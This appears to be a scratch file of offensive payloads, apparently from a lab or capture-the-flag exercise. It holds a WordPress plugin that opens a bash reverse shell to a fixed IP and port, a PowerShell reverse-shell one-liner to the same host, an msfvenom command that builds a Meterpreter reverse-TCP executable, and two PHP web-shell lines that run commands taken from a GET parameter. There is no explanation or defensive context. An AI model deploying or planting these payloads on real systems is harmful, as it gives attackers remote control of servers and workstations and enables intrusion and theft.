<?php
//nothing worked here
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.4.23.120/1234 0>&1'");
?>

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.23.120',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.23.120 LPORT=1234 -f exe > reverse.exe

<?php system($_GET["lfi"]);?> 
<?php system($_GET['lfi']) ?>